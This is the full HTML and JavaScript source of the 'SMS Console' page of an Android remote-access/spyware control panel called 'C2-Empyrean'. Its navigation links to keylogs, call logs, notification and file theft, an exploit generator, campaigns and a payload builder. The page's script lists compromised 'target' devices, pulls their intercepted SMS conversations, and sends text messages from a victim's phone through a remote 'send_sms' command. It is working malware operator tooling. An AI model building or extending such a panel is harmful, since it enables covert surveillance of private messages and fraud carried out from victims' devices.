<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Console - C2-Empyrean</title>
    <link rel="stylesheet" href="/assets/css/dashboard.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #e0e0e0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
        }

        .app-container { display: flex; min-height: 100vh; }

        .sidebar {
            width: 260px;
            background: rgba(255, 255, 255, 0.02);
            border-right: 1px solid rgba(255, 255, 255, 0.05);
            padding: 24px 16px;
            position: fixed;
            top: 0; left: 0;
            height: 100vh;
            overflow-y: auto;
            z-index: 100;
        }

        .sidebar-logo {
            font-size: 22px; font-weight: 800;
            background: linear-gradient(135deg, #00d4ff, #7b2ff7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 32px; padding: 0 12px;
        }

        .sidebar-nav { list-style: none; }
        .sidebar-nav li { margin-bottom: 4px; }
        .sidebar-nav a {
            display: flex; align-items: center; gap: 12px;
            padding: 10px 12px; color: rgba(255, 255, 255, 0.5);
            text-decoration: none; border-radius: 10px;
            font-size: 14px; font-weight: 500; transition: all 0.2s ease;
        }
        .sidebar-nav a:hover { background: rgba(255, 255, 255, 0.05); color: rgba(255, 255, 255, 0.8); }
        .sidebar-nav a.active { background: rgba(123, 47, 247, 0.15); color: #7b2ff7; }
        .sidebar-nav .icon { width: 20px; text-align: center; font-size: 16px; }
        .sidebar-divider { border: none; border-top: 1px solid rgba(255, 255, 255, 0.05); margin: 16px 12px; }
        .sidebar-section-title { color: rgba(255, 255, 255, 0.2); font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1.5px; padding: 8px 12px; }

        .main-content {
            margin-left: 260px; flex: 1;
            padding: 28px 32px;
            max-width: calc(100vw - 260px);
        }

        .page-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px; }
        .page-title { font-size: 28px; font-weight: 700; color: #fff; }
        .page-title span { font-size: 14px; font-weight: 400; color: rgba(255, 255, 255, 0.3); }

        .header-actions { display: flex; gap: 12px; align-items: center; }
        .header-btn {
            padding: 8px 16px; background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px;
            color: rgba(255, 255, 255, 0.7); font-size: 13px;
            cursor: pointer; transition: all 0.2s; text-decoration: none;
        }
        .header-btn:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }
        .header-btn.primary { background: linear-gradient(135deg, #7b2ff7, #00d4ff); border: none; color: #fff; }

        .sms-layout {
            display: grid;
            grid-template-columns: 300px 1fr;
            gap: 20px;
            height: calc(100vh - 160px);
        }

        .threads-panel {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 16px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        .threads-header {
            padding: 16px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
            font-weight: 600;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.5);
        }

        .thread-list {
            flex: 1;
            overflow-y: auto;
        }

        .thread-item {
            padding: 12px 16px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
            cursor: pointer;
            transition: all 0.2s;
        }
        .thread-item:hover { background: rgba(255, 255, 255, 0.03); }
        .thread-item.active { background: rgba(123, 47, 247, 0.1); border-left: 3px solid #7b2ff7; }

        .thread-item .thread-contact {
            font-weight: 600; font-size: 14px; color: #fff;
        }
        .thread-item .thread-preview {
            font-size: 12px; color: rgba(255, 255, 255, 0.4);
            margin-top: 4px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
        }
        .thread-item .thread-time {
            font-size: 11px; color: rgba(255, 255, 255, 0.2);
            float: right;
        }

        .messages-panel {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 16px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .messages-header {
            padding: 16px 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
            font-weight: 600;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .messages-header .contact-name { color: #fff; font-size: 16px; }
        .messages-header .contact-info { font-size: 12px; color: rgba(255, 255, 255, 0.3); }

        .messages-body {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .message-bubble {
            max-width: 75%;
            padding: 10px 14px;
            border-radius: 12px;
            font-size: 13px;
            line-height: 1.4;
        }

        .message-bubble.incoming {
            background: rgba(255, 255, 255, 0.08);
            align-self: flex-start;
            border-bottom-left-radius: 4px;
        }

        .message-bubble.outgoing {
            background: rgba(123, 47, 247, 0.3);
            align-self: flex-end;
            border-bottom-right-radius: 4px;
        }

        .message-bubble .msg-time {
            font-size: 10px;
            color: rgba(255, 255, 255, 0.3);
            margin-top: 4px;
            text-align: right;
        }

        .messages-input-bar {
            display: flex;
            gap: 10px;
            padding: 16px 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.06);
        }

        .messages-input-bar input {
            flex: 1;
            padding: 10px 14px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 8px;
            color: #fff;
            font-size: 13px;
            outline: none;
        }
        .messages-input-bar input:focus { border-color: #7b2ff7; }
        .messages-input-bar button {
            padding: 10px 20px;
            background: linear-gradient(135deg, #7b2ff7, #00d4ff);
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            cursor: pointer;
            font-size: 13px;
        }
        .messages-input-bar button:hover { opacity: 0.9; }

        .empty-state { color: rgba(255, 255, 255, 0.2); text-align: center; padding: 60px 20px; }

        .device-selector {
            margin-bottom: 20px;
        }

        .device-selector select {
            padding: 10px 14px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 8px;
            color: #fff;
            font-size: 13px;
            outline: none;
            min-width: 250px;
            cursor: pointer;
        }
        .device-selector select:focus { border-color: #7b2ff7; }
        .device-selector select option { background: #1a1a2e; }
        .device-selector label { font-size: 13px; color: rgba(255, 255, 255, 0.4); margin-right: 12px; }

        @media (max-width: 768px) {
            .sidebar { display: none; }
            .main-content { margin-left: 0; max-width: 100%; padding: 20px; }
            .sms-layout { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="app-container">
        <nav class="sidebar">
            <div class="sidebar-logo">C2-Empyrean</div>
            <div class="sidebar-section-title">Main</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/dashboard"><span class="icon">📊</span> Dashboard</a></li>
                <li><a href="/admin/devices"><span class="icon">📱</span> Devices</a></li>
                <li><a href="/admin/map_view"><span class="icon">🗺️</span> Map View</a></li>
                <li><a href="/admin/command_console"><span class="icon">⚡</span> Command Console</a></li>
                <li><a href="/admin/analytics"><span class="icon">📈</span> Analytics</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">Data</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/keylog_viewer"><span class="icon">⌨️</span> Keylogs</a></li>
                <li><a href="/admin/sms_console" class="active"><span class="icon">💬</span> SMS</a></li>
                <li><a href="/admin/call_logs"><span class="icon">📞</span> Call Logs</a></li>
                <li><a href="/admin/notification_viewer"><span class="icon">🔔</span> Notifications</a></li>
                <li><a href="/admin/file_browser"><span class="icon">📁</span> Files</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">Actions</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/exploit_generator"><span class="icon">🎣</span> Exploit Generator</a></li>
                <li><a href="/admin/campaign_manager"><span class="icon">📢</span> Campaigns</a></li>
                <li><a href="/admin/builder"><span class="icon">🔧</span> Builder</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">System</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/settings"><span class="icon">⚙️</span> Settings</a></li>
                <li><a href="/admin/telegram_settings"><span class="icon">🤖</span> Telegram</a></li>
            </ul>
        </nav>

        <main class="main-content">
            <div class="page-header">
                <h1 class="page-title">💬 SMS Console <span>intercept &amp; send</span></h1>
                <div class="header-actions">
                    <a href="/api/export/csv?type=sms" class="header-btn">📥 Export</a>
                </div>
            </div>

            <div class="device-selector">
                <label>Target Device:</label>
                <select id="deviceSelect" onchange="loadThreads()">
                    <option value="">Select a device...</option>
                </select>
            </div>

            <div class="sms-layout">
                <div class="threads-panel">
                    <div class="threads-header">💬 Conversations</div>
                    <div class="thread-list" id="threadList">
                        <div class="empty-state">Select a device to view SMS threads</div>
                    </div>
                </div>

                <div class="messages-panel">
                    <div class="messages-header">
                        <div>
                            <div class="contact-name" id="contactName">Select a conversation</div>
                            <div class="contact-info" id="contactInfo">—</div>
                        </div>
                        <button class="header-btn" onclick="refreshMessages()">🔄 Refresh</button>
                    </div>

                    <div class="messages-body" id="messagesBody">
                        <div class="empty-state" style="padding:60px 20px;">Select a thread to view messages</div>
                    </div>

                    <div class="messages-input-bar">
                        <input type="text" id="smsInput" placeholder="Type a message to send..." disabled>
                        <button id="sendSmsBtn" onclick="sendSms()" disabled>Send</button>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script>
        let selectedDeviceId = null;
        let selectedThread = null;
        let autoRefreshInterval = null;

        document.addEventListener('DOMContentLoaded', function() {
            loadDevices();
        });

        async function loadDevices() {
            try {
                const response = await fetch('/api/devices/list?page=1&per_page=100', {
                    headers: { 'Authorization': 'Bearer ' + getCookie('access_token') }
                });
                const result = await response.json();
                if (!result.success) {
                    if (result.code === 401) { window.location.href = '/admin/login'; return; }
                    return;
                }

                const select = document.getElementById('deviceSelect');
                const devices = result.data.devices || [];
                select.innerHTML = '<option value="">Select a device...</option>' +
                    devices.map(d => `<option value="${d.device_id}">${d.device_id} — ${d.model || 'unknown'}</option>`).join('');
            } catch (err) {
                console.error('Error:', err);
            }
        }

        async function loadThreads() {
            selectedDeviceId = document.getElementById('deviceSelect').value;
            selectedThread = null;
            document.getElementById('contactName').textContent = 'Select a conversation';
            document.getElementById('contactInfo').textContent = '—';
            document.getElementById('messagesBody').innerHTML = '<div class="empty-state" style="padding:60px 20px;">Select a thread to view messages</div>';
            document.getElementById('smsInput').disabled = true;
            document.getElementById('sendSmsBtn').disabled = true;

            if (!selectedDeviceId) {
                document.getElementById('threadList').innerHTML = '<div class="empty-state">Select a device to view SMS threads</div>';
                return;
            }

            if (autoRefreshInterval) clearInterval(autoRefreshInterval);
            autoRefreshInterval = setInterval(loadThreads, 15000);

            try {
                const response = await fetch(`/api/sms/fetch?device_id=${encodeURIComponent(selectedDeviceId)}&group_by=thread`, {
                    headers: { 'Authorization': 'Bearer ' + getCookie('access_token') }
                });
                const result = await response.json();
                if (!result.success) return;

                const threads = result.data.threads || [];
                const list = document.getElementById('threadList');

                if (threads.length === 0) {
                    list.innerHTML = '<div class="empty-state">No SMS threads found</div>';
                    return;
                }

                list.innerHTML = threads.map(t => `
                    <div class="thread-item" onclick="selectThread('${t.address}')">
                        <span class="thread-time">${formatTime(t.last_time)}</span>
                        <div class="thread-contact">${t.address}</div>
                        <div class="thread-preview">${t.last_message || '—'}</div>
                    </div>
                `).join('');

            } catch (err) {
                console.error('Error:', err);
            }
        }

        async function selectThread(address) {
            selectedThread = address;
            document.getElementById('contactName').textContent = address;
            document.getElementById('contactInfo').textContent = `Device: ${selectedDeviceId}`;
            document.getElementById('smsInput').disabled = false;
            document.getElementById('sendSmsBtn').disabled = false;

            try {
                const response = await fetch(`/api/sms/fetch?device_id=${encodeURIComponent(selectedDeviceId)}&address=${encodeURIComponent(address)}`, {
                    headers: { 'Authorization': 'Bearer ' + getCookie('access_token') }
                });
                const result = await response.json();
                if (!result.success) return;

                const messages = result.data.messages || [];
                const body = document.getElementById('messagesBody');
                body.innerHTML = messages.map(m => `
                    <div class="message-bubble ${m.type === 'sent' || m.type === 'outgoing' ? 'outgoing' : 'incoming'}">
                        ${escapeHtml(m.body || '')}
                        <div class="msg-time">${formatTime(m.date)}</div>
                    </div>
                `).join('');

                body.scrollTop = body.scrollHeight;

            } catch (err) {
                console.error('Error:', err);
            }
        }

        function refreshMessages() {
            if (selectedThread) selectThread(selectedThread);
        }

        async function sendSms() {
            const input = document.getElementById('smsInput');
            const body = input.value.trim();
            if (!body || !selectedDeviceId || !selectedThread) return;

            input.value = '';

            try {
                const response = await fetch('/api/device/command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': 'Bearer ' + getCookie('access_token')
                    },
                    body: JSON.stringify({
                        device_id: selectedDeviceId,
                        command: 'send_sms',
                        params: { address: selectedThread, body: body }
                    })
                });
                const result = await response.json();
                if (result.success) {
                    // Add message to view
                    const body = document.getElementById('messagesBody');
                    const msgDiv = document.createElement('div');
                    msgDiv.className = 'message-bubble outgoing';
                    msgDiv.innerHTML = `${escapeHtml(body)}<div class="msg-time">Just now</div>`;
                    body.appendChild(msgDiv);
                    body.scrollTop = body.scrollHeight;
                }
            } catch (err) {
                console.error('Error:', err);
            }
        }

        function formatTime(ts) {
            if (!ts) return '—';
            const d = new Date(ts * 1000);
            return d.toLocaleString();
        }

        function escapeHtml(str) {
            const div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        }

        function getCookie(name) {
            const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
            return match ? decodeURIComponent(match[2]) : null;
        }
    </script>
</body>
</html>
